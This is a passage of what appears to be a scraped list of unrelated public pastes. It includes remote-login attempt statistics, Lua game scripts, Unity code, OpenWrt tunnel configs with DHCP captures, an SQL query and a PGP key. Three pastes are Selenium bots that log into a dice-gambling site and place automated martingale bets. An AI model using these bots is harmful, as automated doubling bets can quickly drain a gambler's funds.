    ""Input Output Flood LLC"": 2,
    ""Vodafone Network"": 5,
    ""Xhost Internet Solutions LP"": 7,
    ""Bunea TELECOM SRL"": 1,
    ""Horizon LLC"": 6,
    ""Chinanet"": 6,
    ""Hangzhou Alibaba Advertising Co"": 1,
    ""OVH SAS"": 1,
    ""Korea Telecom"": 1,
    ""VietNam Post and Telecom Corporation"": 1,
    ""Private Layer INC"": 1,
    ""Hainan Network of ChinaTelecom"": 1,
    ""Internet Solutions & Innovations LTD."": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""DigitalOcean, LLC"": 5,
    ""Advanced Internet Technologies"": 4
  },
  ""org"": {
    ""Flyservers S.A"": 23,
    ""Verizon Business"": 11,
    ""Censys, Inc."": 1,
    ""Bandito Networks"": 2,
    ""Makut Investments"": 3,
    ""ColocationX Ltd"": 3,
    ""Palo Alto Networks, Inc"": 12,
    ""Linode"": 1,
    ""Vultr Holdings LLC"": 3,
    ""rdpdaddy.com"": 2,
    ""Unknown"": 6,
    ""Xhost Internet Solutions"": 5,
    ""Bunea TELECOM SRL"": 1,
    ""Horizon LLC"": 6,
    ""Chinanet JS"": 6,
    ""Xhostis"": 2,
    ""Aliyun Computing Co., LTD"": 1,
    ""OVH GmbH"": 1,
    ""Kornet"": 1,
    ""Hanoi Post and Telecom Company"": 1,
    ""Fast Serv Inc."": 1,
    ""Tribeka Web Advisors S.A"": 1,
    ""UAB Host Baltic"": 3,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""DigitalOcean, LLC"": 5,
    ""Verizon Communications"": 4
  },
  ""regionName"": {
    ""Kaunas"": 23,
    ""New Jersey"": 12,
    ""Hesse"": 3,
    ""New York"": 2,
    ""Virginia"": 3,
    ""North Holland"": 10,
    ""California"": 16,
    ""North West"": 1,
    ""Maharashtra"": 3,
    ""Arizona"": 2,
    ""Tirana"": 5,
    ""Timi\u015f"": 1,
    ""Moscow"": 6,
    ""Jiangsu"": 6,
    ""Beijing"": 1,
    ""Seoul"": 1,
    ""Hanoi"": 1,
    ""Bern"": 1,
    ""Hainan"": 1,
    ""Mariehamns stad"": 1,
    ""Vilnius"": 3,
    ""North Carolina"": 4
  },
  ""country"": {
    ""Lithuania"": 26,
    ""United States"": 39,
    ""Germany"": 3,
    ""The Netherlands"": 10,
    ""Singapore"": 1,
    ""India"": 3,
    ""Albania"": 5,
    ""Romania"": 1,
    ""Russia"": 6,
    ""China"": 8,
    ""South Korea"": 1,
    ""Vietnam"": 1,
    ""Switzerland"": 1,
    ""Aland Islands"": 1
  },
  ""account"": {
    ""142.93.8.59"": 37,
    ""(empty)"": 4,
    ""Domain"": 13,
    ""iWxWQpgHl"": 1,
    ""oZGAdS"": 1,
    ""DkejFO"": 1,
    ""admin"": 1,
    ""hello"": 14,
    ""Test"": 10,
    ""Administr"": 9,
    ""eAOkzIsnP"": 1,
    ""ROIiXf"": 1,
    ""fWajna"": 1,
    ""Administrator"": 1,
    ""335mp1c7"": 4,
    ""beio"": 1,
    ""WxCfpwGti"": 1,
    ""mkPSPA"": 1,
    ""gWZgxe"": 1,
    ""JxOEjhJFj"": 1,
    ""JCDSSa"": 1,
    ""NpOYNB"": 1
  },
  ""keyboard"": {
    ""Unknown"": 106
  },
  ""client_build"": {
    ""Unknown"": 106
  },
  ""client_name"": {
    ""Unknown"": 106
  },
  ""ip_type"": {
    ""Unknown"": 70,
    ""mobile & proxy"": 2,
    ""mobile"": 3,
    ""hosting"": 26,
    ""hosting & proxy"": 5
  }
}"
VUpqVQe0,EnderEx POS - v0.1.0,Biotic,Lua,Tuesday 2nd of January 2024 05:36:13 PM CDT,"-- Computercraft POS script for EnderExchange

local apiUrl = ""https://ender-exchange.vercel.app""

local function shutdownWithMessage(message, delay)
    term.clear()
    term.setCursorPos(1, 1)
    print(message)
    sleep(delay or 3)
    os.shutdown()
end

local function displayWelcome()
    term.clear()
    term.setCursorPos(1, 1)
    print(""EnderEx POS - v0.1.0"")
    sleep(2)  -- Pause to display the welcome message
end

local function getAuthToken(username, pin)
    local headers = {[""Content-Type""] = ""application/json""}
    local body = textutils.serialiseJSON({username = username, pin = pin})
    local response = http.post(apiUrl .. ""/authenticate"", body, headers)

    if response then
        local data = textutils.unserialiseJSON(response.readAll())
        response.close()
        if data.token then
            return data.token
        else
            print(""Authentication failed: "" .. (data.message or ""Unknown error""))
            sleep(2)
            return nil
        end
    else
        print(""Failed to connect for authentication."")
        sleep(2)
        return nil
    end
end

local function transfer(token, toUser, amount)
    local headers = {[""Authorization""] = token, [""Content-Type""] = ""application/json""}
    local body = textutils.serialiseJSON({to_user = toUser, amount = amount})
    local response = http.post(apiUrl .. ""/transfer"", body, headers)

    if response then
        local data = textutils.unserialiseJSON(response.readAll())
        response.close()
        if data.message then
            return data.message
        else
            print(""Transfer failed: "" .. (data.error or ""Unknown error""))
            sleep(2)
            return nil
        end
    else
        print(""Failed to connect for transfer."")
        sleep(2)
        return nil
    end
end

local function getUsernameFromDisk()
    print(""Please Insert Your Card (right side)."")
    while not disk.isPresent(""right"") do
        sleep(1) -- check every second for card insertion
    end

    local diskPath = disk.getMountPath(""right"")
    local file = fs.open(diskPath .. ""/username.txt"", ""r"")
    if file then
        local username = file.readLine()
        file.close()
        return username
    else
        print(""Card is empty or unreadable. Please try again."")
        sleep(2)
        return nil
    end
end

local function readRetailerInfo()
    local file = fs.open(""config.txt"", ""r"")
    if file then
        local retailerUsername = file.readLine()
        file.close()
        return retailerUsername
    else
        shutdownWithMessage(""Retailer information not found"")
    end
end

local function promptForTransaction()
    print(""Ready for a new transaction? (y/n)"")
    local choice = string.lower(read())
    return choice == 'y'
end

local function pos()
    displayWelcome()

    local retailerUsername = readRetailerInfo()

    while promptForTransaction() do
        term.clear()
        term.setCursorPos(1, 1)

		-- Displaying the retailer's name for verification
        print(""Transaction with Retailer: "" .. retailerUsername)
		sleep(1)

        print(""Enter item price:"")
        local price = tonumber(read())

        if not price or price <= 0 then
            print(""Invalid price. Please enter a positive integer."")
            sleep(2)
        else
            local customerUsername = getUsernameFromDisk()
            if customerUsername then
				term.clear()
        		term.setCursorPos(1, 1)
                print(""Customer: "" .. customerUsername)
                print(""Enter PIN:"")
                local pin = read(""*"")

                local token = getAuthToken(customerUsername, pin)
                if token then
                    local message = transfer(token, retailerUsername, price)
                    if message then
                        print(message)
                        sleep(3)
                    end
                end
            else
                print(""No customer information provided."")
            end
        end
    end

    shutdownWithMessage(""POS system closed"", 2)
end

pos()
"
HBcFwknU,Untitled,Learning000001,C#,Tuesday 2nd of January 2024 05:29:17 PM CDT,"using System.Collections.Generic;
using UnityEngine;
 
public class Bullet : MonoBehaviour
{
    private const int RAYCAST_MAX_DISTANCE = int.MaxValue;
    private const float SPEED = 20f;
 
    [SerializeField] private int amountOfBounces;
    [HideInInspector] public float aliveTime;
    private float aliveTempTime;
    private bool canDestroy;
    public GameObject impactEffect;
 
    private GameObject previousCollisionObject;
    private int maxBounces;
    private Vector3 currentDirection;
 
    private void Start()
    {
        maxBounces = amountOfBounces;
        aliveTempTime = aliveTime;
        currentDirection = transform.up.normalized;
    }
 
    private void Update()
    {
        HandleTimer();
    }
    
    private void HandleTimer()
    {
        if (aliveTempTime < 0)
        {
            return;
        }
 
        aliveTempTime -= Time.deltaTime;
        if (aliveTempTime <= 0)
        {
            canDestroy = true;
        }
    }
 
    private void FixedUpdate()
    {
        MoveTowardsPathPoint();
    }
 
    private void MoveTowardsPathPoint()
    {
        BulletPath _target = GetNextTarget(previousCollisionObject);
 
        if (_target == default)
        {
            Destroy(gameObject);
            return;
        }
 
        MoveTowardsTarget(_target);
 
        if (!DidReachTarget(_target))
        {
            return;
        }
 
        HandleCollisionAndReflection(_target);
        InstantiateImpactEffect();
        CheckDestroyConditions();
    }
 
    private void MoveTowardsTarget(BulletPath _target)
    {
        Transform _bulletTransform = transform;
        _bulletTransform.position = Vector3.MoveTowards(_bulletTransform.position, _target.ImpactPoint, SPEED * Time.deltaTime);
    }
 
    private bool DidReachTarget(BulletPath _target)
    {
        return Vector3.Distance(transform.position, _target.ImpactPoint) < 0.01f;
    }
 
    private void HandleCollisionAndReflection(BulletPath _target)
    {
        Transform _bulletTransform = transform;
        currentDirection = HandleRaycastHit(currentDirection, _target.RaycastHit2D);
        _bulletTransform.up = currentDirection;
        previousCollisionObject = _target.Collider;
        amountOfBounces--;
    }
 
    private void InstantiateImpactEffect()
    {
        if (impactEffect == null)
        {
            return;
        }
        GameObject _impact = Instantiate(impactEffect);
        _impact.transform.position = transform.position;
        Destroy(_impact, 1f);
    }
 
    private void CheckDestroyConditions()
    {
        if (canDestroy || amountOfBounces == 0)
        {
            Destroy(gameObject);
        }
    }
 
    private BulletPath GetNextTarget(GameObject _ignoreObject)
    {
        var _bulletTransform = transform;
        Vector2 _startingPosition = _bulletTransform.position;
        Vector2 _direction = _bulletTransform.up.normalized;
        List<BulletPath> _path = GetPath(_startingPosition, _direction, maxBounces, _ignoreObject);
 
        return _path != default && _path.Count > 0 ? _path[0] : default;
    }
 
    public static List<BulletPath> GetPath(Vector2 _startingPosition, Vector2 _direction, int _bouncesLeft, GameObject _currentObject)
    {
        List<BulletPath> _path = new List<BulletPath>();
        AddPoint(_startingPosition, _direction, _bouncesLeft, _currentObject, _path);
        return _path;
    }
 
    private static void AddPoint(Vector2 _startingPosition, Vector2 _direction, int _bouncesLeft, GameObject _currentObject, List<BulletPath> _path)
    {
        while (true)
        {
            RaycastHit2D _validHit = GetValidHit(_startingPosition, _direction, _currentObject);
 
            if (_validHit == default)
            {
                return;
            }
 
            Vector2 _newStartingPosition = _validHit.point;
            Vector2 _newDirection = HandleRaycastHit(_direction, _validHit);
            _bouncesLeft--;
 
            _path.Add(new BulletPath { ImpactPoint = _newStartingPosition, Collider = _validHit.transform.gameObject, RaycastHit2D = _validHit });
 
            if (_bouncesLeft <= 0)
            {
                return;
            }
 
            _startingPosition = _newStartingPosition;
            _direction = _newDirection;
            _currentObject = _validHit.transform.gameObject;
        }
    }
 
    private static RaycastHit2D GetValidHit(Vector2 _startingPosition, Vector2 _direction, GameObject _currentObject)
    {
        RaycastHit2D[] _hits = Physics2D.RaycastAll(_startingPosition, _direction, RAYCAST_MAX_DISTANCE);
 
        foreach (RaycastHit2D _hit in _hits)
        {
            GameObject _hitObject = _hit.transform.gameObject;
 
            if (!_hitObject.CompareTag(""Wall"") && !_hitObject.CompareTag(""Ground""))
            {
                continue;
            }
 
            if (_hitObject == _currentObject)
            {
                continue;
            }
 
            return _hit;
        }
 
        return default;
    }
 
    private static Vector3 HandleRaycastHit(Vector3 _currentDirection, RaycastHit2D _hit)
    {
        Vector2 _wallNormal = _hit.normal;
        return Vector2.Reflect(_currentDirection, _wallNormal).normalized;
    }
}"
yBmTPsVG,JDbot python by snowy,coinwalk,JavaScript,Tuesday 2nd of January 2024 05:16:49 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
import time, re, math
from decimal import Decimal
from selenium.webdriver.firefox.options import Options

options = Options()
options.add_argument(""--headless"")
driver = webdriver.Firefox(options=options)
print(""please wait loading page and login"")
driver.get(""https://just-dice.com"")
time.sleep(20)
driver.find_element(By.CSS_SELECTOR, ""a.fancybox-item.fancybox-close"").click()
time.sleep(5)
driver.find_element(By.LINK_TEXT, ""Account"").click()
time.sleep(2)
driver.find_element(By.ID, ""myuser"").clear()
driver.find_element(By.ID, ""myuser"").send_keys(""USERNAME"")
time.sleep(0.01)
driver.find_element(By.ID, ""mypass"").clear()
driver.find_element(By.ID, ""mypass"").send_keys(""PASSWORD"")
time.sleep(0.01)
driver.find_element(By.ID, ""myok"").click()
time.sleep(20)  
print(""logged in"")
fart = 0.0	
fumble = 0.0001
print(""should see bets"")

def go(): 
    base = 0.0001
    tens = (base*10)
    sevens = (base*6.9)
    eights = (base*7.1)
    balance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
    global fumble 
    global fart
    if ((float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights)) and (not (float(balance)==fart))):
        fumble = float(fumble)*2
        fart = float(balance)
    if ((fumble>=tens) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        fart = 0.0
    time.sleep(0.1)
    driver.find_element(By.ID, ""pct_chance"").clear()
    driver.find_element(By.ID, ""pct_chance"").send_keys(""49.5000"")
    driver.find_element(By.ID, ""pct_bet"").clear()
    driver.find_element(By.ID, ""pct_bet"").send_keys(float(fumble))
    driver.find_element(By.ID, ""a_lo"").click()
    time.sleep(0.8)
    go()
    
if (1==1):
    go()"
8HB6Ga3f,snowybot python,coinwalk,JavaScript,Tuesday 2nd of January 2024 05:01:57 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os, sys
import select
import logging
from logging.handlers import TimedRotatingFileHandler
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
import time, re, math
from decimal import Decimal
from datetime import datetime, timedelta
import traceback
import signal
from selenium.webdriver.firefox.options import Options

options = Options()
options.add_argument(""--headless"")
driver = webdriver.Firefox(options=options)
print(""please wait loading page and login"")
driver.get(""https://just-dice.com"")
time.sleep(20)
driver.find_element(By.CSS_SELECTOR, ""a.fancybox-item.fancybox-close"").click()
time.sleep(5)
driver.find_element(By.LINK_TEXT, ""Account"").click()
time.sleep(2)
driver.find_element(By.ID, ""myuser"").clear()
driver.find_element(By.ID, ""myuser"").send_keys(""USERNAME"")
time.sleep(0.01)
driver.find_element(By.ID, ""mypass"").clear()
driver.find_element(By.ID, ""mypass"").send_keys(""PASSWORD"")
time.sleep(0.01)
driver.find_element(By.ID, ""myok"").click()
time.sleep(20)  
print(""logged in"")
fart = 0.0	
fumble = 0.0001
print(""should see bets"")

def go(): 
    base = 0.0001
    tens = (base*10)
    sevens = (base*6.9)
    eights = (base*7.1)
    balance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
    global fumble 
    global fart
    if ((float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights)) and (not (float(balance)==fart))):
        fumble = float(fumble)*2
        fart = float(balance)
    if ((fumble>=tens) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        fart = 0.0
    time.sleep(0.1)
    driver.find_element(By.ID, ""pct_chance"").clear()
    driver.find_element(By.ID, ""pct_chance"").send_keys(""49.5000"")
    driver.find_element(By.ID, ""pct_bet"").clear()
    driver.find_element(By.ID, ""pct_bet"").send_keys(float(fumble))
    driver.find_element(By.ID, ""a_lo"").click()
    time.sleep(0.8)
    go()
    
if (1==1):
    go()"
eZvjYcSJ,Router R2 - tcpdump eth0,mar_w,Bash,Tuesday 2nd of January 2024 04:46:34 PM CDT,"Klient1 <-(eth0+eth0.3)-> Router1 <---(WG+GRETAP)---> Router2
 
Klient 1 - restart interfejsu eth0 (+ eth0.3 który jest razem z nim)
TCPdump z eth0 z Routera2 (wysyła adres z serwera DHCP ""guest"")

# tcpdump -i eth0 -ne port 67 and 68
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
23:32:12.125901 08:00:27:81:94:27 > ff:ff:ff:ff:ff:ff, ethertype 802.1Q (0x8100), length 346: vlan 3, p 0, ethertype IPv4 (0x0800), 0.0.0.0.68 > 255.255.255.255.67: BOOTP/DHCP, Request from 08:00:27:81:94:27, length 300
23:32:12.126764 08:00:27:81:94:27 > ff:ff:ff:ff:ff:ff, ethertype 802.1Q (0x8100), length 346: vlan 3, p 0, ethertype IPv4 (0x0800), 0.0.0.0.68 > 255.255.255.255.67: BOOTP/DHCP, Request from 08:00:27:81:94:27, length 300
^C
2 packets captured
2 packets received by filter
0 packets dropped by kernel"
GEwVpHz6,Router R1 - tcpdump eth0,mar_w,Bash,Tuesday 2nd of January 2024 04:42:06 PM CDT,"Klient1 <-(eth0+eth0.3)-> Router1 <---(WG+GRETAP)---> Router2
 
Klient 1 - restart interfejsu eth0 (+ eth0.3 który jest razem z nim)
TCPdump z eth0 z Routera1 (wysyła adres z własnego serwera DHCP i przerzuca zapytania ze zdalnego serwera DHCP ""guest"" z R2)

# tcpdump -i eth0 port 67 and 68 -ne
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
23:32:08.527476 08:00:27:81:94:27 > 08:00:27:a1:33:0d, ethertype IPv4 (0x0800), length 342: 192.168.3.227.68 > 192.168.3.2.67: BOOTP/DHCP, Request from 08:00:27:81:94:27, length 300
23:32:12.155667 08:00:27:81:94:27 > ff:ff:ff:ff:ff:ff, ethertype 802.1Q (0x8100), length 346: vlan 3, p 0, ethertype IPv4 (0x0800), 0.0.0.0.68 > 255.255.255.255.67: BOOTP/DHCP, Request from 08:00:27:81:94:27, length 300
23:32:12.156069 08:00:27:81:94:27 > ff:ff:ff:ff:ff:ff, ethertype IPv4 (0x0800), length 342: 0.0.0.0.68 > 255.255.255.255.67: BOOTP/DHCP, Request from 08:00:27:81:94:27, length 300
23:32:12.156293 08:00:27:17:ee:b0 > 08:00:27:81:94:27, ethertype 802.1Q (0x8100), length 346: vlan 3, p 0, ethertype IPv4 (0x0800), 10.10.0.2.67 > 10.10.0.227.68: BOOTP/DHCP, Reply, length 300
23:32:12.156552 08:00:27:81:94:27 > ff:ff:ff:ff:ff:ff, ethertype 802.1Q (0x8100), length 346: vlan 3, p 0, ethertype IPv4 (0x0800), 0.0.0.0.68 > 255.255.255.255.67: BOOTP/DHCP, Request from 08:00:27:81:94:27, length 300
23:32:12.157195 08:00:27:17:ee:b0 > 08:00:27:81:94:27, ethertype 802.1Q (0x8100), length 355: vlan 3, p 0, ethertype IPv4 (0x0800), 10.10.0.2.67 > 10.10.0.227.68: BOOTP/DHCP, Reply, length 309
23:32:15.158035 08:00:27:81:94:27 > ff:ff:ff:ff:ff:ff, ethertype IPv4 (0x0800), length 342: 0.0.0.0.68 > 255.255.255.255.67: BOOTP/DHCP, Request from 08:00:27:81:94:27, length 300
23:32:15.160093 08:00:27:a1:33:0d > 08:00:27:81:94:27, ethertype IPv4 (0x0800), length 342: 192.168.3.2.67 > 192.168.3.227.68: BOOTP/DHCP, Reply, length 300
23:32:15.160390 08:00:27:a1:33:0d > 08:00:27:81:94:27, ethertype IPv4 (0x0800), length 342: 192.168.3.2.67 > 192.168.3.227.68: BOOTP/DHCP, Reply, length 300
23:32:15.160770 08:00:27:81:94:27 > ff:ff:ff:ff:ff:ff, ethertype IPv4 (0x0800), length 342: 0.0.0.0.68 > 255.255.255.255.67: BOOTP/DHCP, Request from 08:00:27:81:94:27, length 300
23:32:15.160925 08:00:27:a1:33:0d > 08:00:27:81:94:27, ethertype IPv4 (0x0800), length 351: 192.168.3.2.67 > 192.168.3.227.68: BOOTP/DHCP, Reply, length 309
^C
11 packets captured
11 packets received by filter
0 packets dropped by kernel"
W7zFwGhP,jsbot python by snowy,coinwalk,Python,Tuesday 2nd of January 2024 04:38:38 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os, sys
import select
import logging
from logging.handlers import TimedRotatingFileHandler
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
import time, re, math
from decimal import Decimal
from datetime import datetime, timedelta
import traceback
import signal

driver = webdriver.Firefox()
driver.get(""https://just-dice.com"")
time.sleep(20)
driver.find_element(By.CSS_SELECTOR, ""a.fancybox-item.fancybox-close"").click()
time.sleep(5)
driver.find_element(By.LINK_TEXT, ""Account"").click()
time.sleep(2)
driver.find_element(By.ID, ""myuser"").clear()
driver.find_element(By.ID, ""myuser"").send_keys(""USERNAME"")
time.sleep(0.01)
driver.find_element(By.ID, ""mypass"").clear()
driver.find_element(By.ID, ""mypass"").send_keys(""PASSWORD"")
time.sleep(0.01)
driver.find_element(By.ID, ""myok"").click()
time.sleep(20)  
fart = 0.0	
fumble = 0.0001

def go(): 
    base = 0.0001
    tens = (base*10)
    sevens = (base*6.9)
    eights = (base*7.1)
    balance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
    global fumble 
    global fart
    if ((float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights)) and (not (float(balance)==fart))):
        fumble = float(fumble)*2
        fart = float(balance)
    if ((fumble>=tens) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        fart = 0.0
    time.sleep(0.1)
    driver.find_element(By.ID, ""pct_chance"").clear()
    driver.find_element(By.ID, ""pct_chance"").send_keys(""49.5000"")
    driver.find_element(By.ID, ""pct_bet"").clear()
    driver.find_element(By.ID, ""pct_bet"").send_keys(float(fumble))
    driver.find_element(By.ID, ""a_lo"").click()
    time.sleep(0.8)
    go()
    
if (1==1):
    go()"
22jNZLik,Klient R1 - tcpdump eth0,mar_w,Bash,Tuesday 2nd of January 2024 04:35:56 PM CDT,"Klient1 <-(eth0+eth0.3)-> Router1 <---(WG+GRETAP)---> Router2

Klient 1 - restart interfejsu eth0 (+ eth0.3 który jest razem z nim)
Pobieranie dwóch adresów, jeden z sieci LAN1 a drugi z odległej sieci ""guest""

# tcpdump -i eth0 -ne port 68 and 67
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
23:32:08.480410 08:00:27:81:94:27 > 08:00:27:17:ee:b0, ethertype 802.1Q (0x8100), length 346: vlan 3, p 0, ethertype IPv4 (0x0800), 10.10.0.227.68 > 10.10.0.2.67: BOOTP/DHCP, Request from 08:00:27:81:94:27, length 300
23:32:08.481045 08:00:27:81:94:27 > 08:00:27:a1:33:0d, ethertype IPv4 (0x0800), length 342: 192.168.3.227.68 > 192.168.3.2.67: BOOTP/DHCP, Request from 08:00:27:81:94:27, length 300
23:32:12.109335 08:00:27:81:94:27 > ff:ff:ff:ff:ff:ff, ethertype 802.1Q (0x8100), length 346: vlan 3, p 0, ethertype IPv4 (0x0800), 0.0.0.0.68 > 255.255.255.255.67: BOOTP/DHCP, Request from 08:00:27:81:94:27, length 300
23:32:12.109813 08:00:27:81:94:27 > ff:ff:ff:ff:ff:ff, ethertype IPv4 (0x0800), length 342: 0.0.0.0.68 > 255.255.255.255.67: BOOTP/DHCP, Request from 08:00:27:81:94:27, length 300
23:32:12.110225 08:00:27:17:ee:b0 > 08:00:27:81:94:27, ethertype 802.1Q (0x8100), length 346: vlan 3, p 0, ethertype IPv4 (0x0800), 10.10.0.2.67 > 10.10.0.227.68: BOOTP/DHCP, Reply, length 300
23:32:12.110302 08:00:27:81:94:27 > ff:ff:ff:ff:ff:ff, ethertype 802.1Q (0x8100), length 346: vlan 3, p 0, ethertype IPv4 (0x0800), 0.0.0.0.68 > 255.255.255.255.67: BOOTP/DHCP, Request from 08:00:27:81:94:27, length 300
23:32:12.111106 08:00:27:17:ee:b0 > 08:00:27:81:94:27, ethertype 802.1Q (0x8100), length 355: vlan 3, p 0, ethertype IPv4 (0x0800), 10.10.0.2.67 > 10.10.0.227.68: BOOTP/DHCP, Reply, length 309
23:32:15.111724 08:00:27:81:94:27 > ff:ff:ff:ff:ff:ff, ethertype IPv4 (0x0800), length 342: 0.0.0.0.68 > 255.255.255.255.67: BOOTP/DHCP, Request from 08:00:27:81:94:27, length 300
23:32:15.114244 08:00:27:a1:33:0d > 08:00:27:81:94:27, ethertype IPv4 (0x0800), length 342: 192.168.3.2.67 > 192.168.3.227.68: BOOTP/DHCP, Reply, length 300
23:32:15.114422 08:00:27:a1:33:0d > 08:00:27:81:94:27, ethertype IPv4 (0x0800), length 342: 192.168.3.2.67 > 192.168.3.227.68: BOOTP/DHCP, Reply, length 300
23:32:15.114559 08:00:27:81:94:27 > ff:ff:ff:ff:ff:ff, ethertype IPv4 (0x0800), length 342: 0.0.0.0.68 > 255.255.255.255.67: BOOTP/DHCP, Request from 08:00:27:81:94:27, length 300
23:32:15.114925 08:00:27:a1:33:0d > 08:00:27:81:94:27, ethertype IPv4 (0x0800), length 351: 192.168.3.2.67 > 192.168.3.227.68: BOOTP/DHCP, Reply, length 309
^C
12 packets captured
12 packets received by filter
0 packets dropped by kernel

"
xfBcseBe,Router R2 (WG+GRETAP),mar_w,Bash,Tuesday 2nd of January 2024 04:23:23 PM CDT,"Router R2
Na nietagowanym porcie eth0 uruchomiony jest serwer DHCP dla swoich Klientów (LAN2).
Router R2 jest połączony tunelem WG + GRETAP z Routerem R1
Na tagowanym porcie eth0.3 będzie rozgłaszał sieć ""guest"" po DHCP.
Tagowany port eth0.3 jest w Bridge z interfejsem GRETAP (gre4t-tunA)
Bridge zawierający interfejsy eth0.3 i gre4t-tunA nosi nazwę ""br-gre""

# cat /etc/config/network
config interface 'lan'
	option device 'eth0'
	option proto 'static'
	option ipaddr '192.168.2.1'
	option netmask '255.255.255.0'

config device
	option name 'br-gre'
	option type 'bridge'
	list ports 'eth0.3'
	list ports 'gre4t-tunA'

config interface 'tunA'
        option proto 'gretap'
        option peeraddr '10.9.0.1'  #zdalna końcówka tunelu WG
        option ipaddr '10.9.0.2'    #lokalny adres WG

config interface 'guest'
        option device 'br-gre'
        option proto 'static'
        option ipaddr '10.10.0.2'  #tu jest uruchomiony serwer DHCP na brigde dla sieci ""guest"" 10.10.0.0/24
		option netmask '255.255.255.0'"
twt9FepE,Router R1 (WG+GRETAP),mar_w,Bash,Tuesday 2nd of January 2024 04:08:45 PM CDT,"Router R1.
Na nietagowanym porcie eth0 uruchomiony jest serwer DHCP dla Klienta1 (LAN).
Router R1 jest połączony tunelem WG + GRETAP z Routerem R2
Na tagowanym porcie eth0.3 będzie przerzucał sieć z Routera2.
Tagowany port eth0.3 jest w Bridge z interfejsem GRETAP (gre4t-tunA)
Bridge zawierający interfejsy eth0.3 i gre4t-tunA nosi nazwę ""br-gre"" 


# cat /etc/config/network

config interface 'lan'
	option device 'eth0'
	option proto 'static'
	option ipaddr '192.168.3.2'
	option netmask '255.255.255.0'
	option ip6assign '60'

config device
	option name 'br-gre'
	option type 'bridge'
	list ports 'eth0.3'
	list ports 'gre4t-tunA'

config interface 'tunA'
        option proto 'gretap'
        option peeraddr '10.9.0.2' #zdalna końcówka tunelu WG
        option ipaddr '10.9.0.1'   #lokalny adres WG

config interface 'guest'
        option device 'br-gre'
        option proto 'static'
        option ipaddr '10.10.0.1'  #adres z puli ""guest"" zdalnego Routera R2
     	option netmask '255.255.255.0'



"
gD203Rha,Klient_R1,mar_w,Bash,Tuesday 2nd of January 2024 03:56:00 PM CDT,"Klient Routera R1 podłączony do portu eth0.
Na nietagowanym porcie eth0 dostaje po DHCP adres IP od Routera R1.
Na tagowanym porcie eth0.3 dostaje po DHCP adres IP od odległego Routera R2 poprzez tunel GRETAP + Wireguard

# cat /etc/config/network	
config interface 'lan'
	option device 'eth0'
	option proto 'dhcp'

config interface 'guest'
	option device 'eth0.3'
	option proto 'dhcp'

"
xegMqwS5,Untitled,blackskye,SQL,Tuesday 2nd of January 2024 03:34:57 PM CDT,"select 
PDBC_PFX, BSBS_TYPE, 
STRING_AGG(CAST(BSTX_TEXT as VARCHAR(MAX)), '') WITHIN GROUP ( ORDER BY BSTX_SEQ_NO ASC ) as BSTX0
from dbo.CMC_BSTX_SUM_TEXT
where PDBC_PFX = 'EH38' and BSBS_TYPE = 'SOBD'
GROUP BY PDBC_PFX, BSBS_TYPE
"
nz6HSfhA,My public key,iFurane,C++,Tuesday 2nd of January 2024 02:21:16 PM CDT,"-----BEGIN PGP PUBLIC KEY BLOCK-----

mDMEZZKtHhYJKwYBBAHaRw8BAQdAr3MEPv/g10B13mVf+Eq8JjoZ6OUc4250MW+5
JzxmF5q0K2lGdXJhbmUgPGlmdXJhbmVAamFiYmVyLmNhbHl4aW5zdGl0dXRlLm9y
Zz6IkwQTFgoAOxYhBBEYs3KyIAjMCYe1SqlekJ7/QZvZBQJlkq0eAhsjBQsJCAcC
AiICBhUKCQgLAgQWAgMBAh4HAheAAAoJEKlekJ7/QZvZadsBAPSRRnCAmQeb5a5h
UO8Wdi/fDlHhPb892IFnBE9+fzCHAQDddKwCIeKj7B+s8bT7QSCekbr7ovbAaE85
f9mdcOpVBLg4BGWSrR4SCisGAQQBl1UBBQEBB0CwcLU4A1QVU2+ozCijhsZDWMN6
AoeemlAZYUwiJhZVWQMBCAeIeAQYFgoAIBYhBBEYs3KyIAjMCYe1SqlekJ7/QZvZ
BQJlkq0eAhsMAAoJEKlekJ7/QZvZZAUBAIBwm7G6VnkvQpqBw/L/d81lec2m5oWF
MSmG1MTxZw//AQDtAqLCF4RpACk7LWk8W9MEwcD4oVpMXWb7LD0cMG59Bg==
=wJo5
-----END PGP PUBLIC KEY BLOCK-----"
5SeBR588,turtle,AssortedBrunoz,Lua,Tuesday 2nd of January 2024 02:07:13 PM CDT,"inputs = {}
print(""Please Input the current y level"")
inputs.y = tonumber(io.read())
y = inputs.y
print(""Please input the amount of Rows"")
inputs.rows = tonumber(io.read())
rows = inputs.rows
print(""Please input the amount of Collums"")
inputs.collumns = tonumber(io.read())
collumns = inputs.collumns
print(""Starting"")
turtle.refuel()
--dig down pillar
function digdown()
	print(""digdown"")
    repeat
        y = y - 1
        if turtle.digDown() == false then
			y = y - 1
            break;
		end
		turtle.down()
		print(y.."" down"")
    until y == -64
    repeat
		os.sleep(1)
